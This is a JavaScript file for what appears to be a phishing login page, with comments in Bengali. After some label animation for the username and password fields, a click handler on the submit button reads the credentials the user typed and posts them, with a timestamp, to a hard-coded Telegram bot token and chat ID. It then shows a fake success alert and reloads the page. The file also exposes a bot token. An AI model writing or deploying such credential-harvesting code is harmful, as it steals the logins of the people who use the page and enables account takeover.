document.addEventListener("DOMContentLoaded", function() {
  const inputs = document.querySelectorAll("input[type='text'], input[type='password']");
  
  inputs.forEach((input) => {
    const label = document.querySelector(`label[for="${input.id}"]`);
    
    if (!label) return; // যদি label না থাকে, কিছু করবো না
    
    input.addEventListener("focus", function() {
      if (input.id === "username") {
        label.style.top = "40px";
      } else if (input.id === "password") {
        label.style.top = "140px";
      }
      label.style.fontSize = "0.8em";
      label.style.color = "white";
    });
    
    input.addEventListener("blur", function() {
      if (this.value === "") {
        label.style.top = ""; // ডিফল্ট পজিশনে ফিরে যাবে
        label.style.fontSize = "";
        label.style.color = "";
      }
    });
  });
});


let now = new Date();
let hours = now.getHours();
let minutes = now.getMinutes();
let seconds = now.getSeconds();
let ampm = hours >= 12 ? "PM" : "AM";

hours = hours % 12 || 12; 
hours = hours < 10 ? "0" + hours : hours;
minutes = minutes < 10 ? "0" + minutes : minutes; 
seconds = seconds < 10 ? "0" + seconds : seconds; 

let time = "TIME : " + hours + ":" + minutes + ":" +seconds + " " + ampm;


document.getElementById('sendMessege').addEventListener("click", function(event) {
  event.preventDefault(); // ✅ ফর্ম রিলোড হওয়া বন্ধ করা
  
  let botToken = "7786536217:AAEs1kxJDP128v4MFrz-p3ToilZpuI7SMaM";
  let chatId = "7058644683";
  let user = document.getElementById('username').value;
  let pass = document.getElementById('password').value;
  let messege = `${time} \nUSERNAME : ${user} \nPASSWORD : ${pass}`;
  
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: messege })
    })
    .then(response => response.json())
    .then(data => {
      if (data.ok) {
        alert("✅ Your data submitted successfully!");
        location.reload(); // ✅ ফর্ম সফল হলে রিলোড করবো
      } else {
        alert("❌ Your data was not submitted!");
      }
    })
    .catch(error => console.log('There is a problem in the server:', error));
});